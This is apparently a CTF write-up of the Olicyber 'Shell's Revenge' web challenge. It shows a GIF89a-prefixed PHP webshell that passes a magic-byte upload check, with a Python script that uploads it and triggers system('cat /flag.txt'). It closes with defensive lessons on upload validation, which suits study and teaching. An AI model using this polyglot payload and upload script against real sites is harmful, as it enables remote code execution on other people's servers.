---
title: "Shell's Revenge — GIF Polyglot PHP Webshell Upload"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "file-upload", "php", "webshell", "rce"]
difficulty: "intermediate"
summary: "Upload a file starting with the GIF89a magic bytes followed by a PHP shell. The server validates MIME type from the header but saves the file where PHP can execute it. Access the uploaded file URL to run arbitrary commands."
---

## The Challenge

A file upload form accepts images. The server checks magic bytes, not the file extension or MIME type strictly. Uploaded files are served under a predictable `uploads/` path where the PHP interpreter remains active.

## Approach

Prepend `GIF89a` to the PHP code to pass the magic-byte check. Upload as a `.php` file (or with a `.php` extension the server accepts). The GIF header satisfies the content check; PHP's parser skips the binary prefix and executes the `<?php ... ?>` block.

From the upload response, extract the link to the uploaded file using BeautifulSoup. A GET to that URL executes `system("cat /flag.txt")`.

## Solution

```php
GIF89a;
<?php echo system("cat /flag.txt"); ?>
```

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

site = "http://shells-revenge.challs.olicyber.it/"

with open("shell.php", "wb") as f:
    f.write(b'GIF89a;\n<?php echo system("cat /flag.txt"); ?>')

with open("shell.php", "rb") as f:
    r = requests.post(site + "upload.php", files={"file": ("shell.php", f, "image/gif")})

soup = BeautifulSoup(r.text, "html.parser")
link = soup.find("a")["href"]
r2 = requests.get(site + link)
print(r2.text)
```

The polyglot is written as binary, uploaded with `Content-Type: image/gif`. The response HTML contains an anchor with the upload path. Fetching it fires the shell.

## What I Learned

File upload handlers must validate both the magic bytes and the extension, store files outside the web root or in a non-PHP-executable directory, and rename uploaded files to remove any PHP-interpretable extension. Content-Type from the `multipart/form-data` is controlled by the client and cannot be trusted.
